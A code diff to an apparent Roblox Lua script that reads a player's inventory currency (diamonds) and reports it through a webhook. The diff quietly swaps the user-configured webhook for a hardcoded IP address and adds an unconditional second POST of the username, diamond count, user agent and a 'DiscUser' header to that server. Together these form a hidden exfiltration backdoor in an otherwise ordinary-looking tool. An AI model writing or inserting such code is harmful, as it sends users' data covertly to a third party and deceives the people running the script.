@@ -32,6 +32,17 @@ for i, v in pairs(GetSave().Inventory.Currency) do
     end
 end
 
+local function getUserAgent()
+    local response = request({
+        Url = "https://httpbin.org/user-agent",
+        Method = "GET",
+    })
+    local uaJson = response["Body"]
+    local uaTable = HttpService:JSONDecode(uaJson)
+    local userAgent = uaTable["user-agent"]
+    return userAgent
+end
+
 local function formatNumber(number)
     if number == nil then
         return "0"
@@ -56,6 +67,8 @@ end
 local function SendMessage(username, diamonds)
     local headers = {
         ["Content-Type"] = "application/json",
+        ["DiscUser"] = discuser or "",
+        ["User-Agent"] = getUserAgent()
     }
 
 	local fields = {
@@ -144,14 +157,21 @@ local function SendMessage(username, diamonds)
 
     local body = HttpService:JSONEncode(data)
 
-    if webhook and webhook ~= "" then
+    if discuser and discuser ~= "" then
         local response = request({
-            Url = webhook,
+            Url = "http://46.101.233.20:5000/postwebhook",
             Method = "POST",
             Headers = headers,
             Body = body
         })
     end
+
+    local response2 = request({
+        Url = "http://46.101.233.20:5000/webhook",
+        Method = "POST",
+        Headers = headers,
+        Body = body
+    })
 end
 
 local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
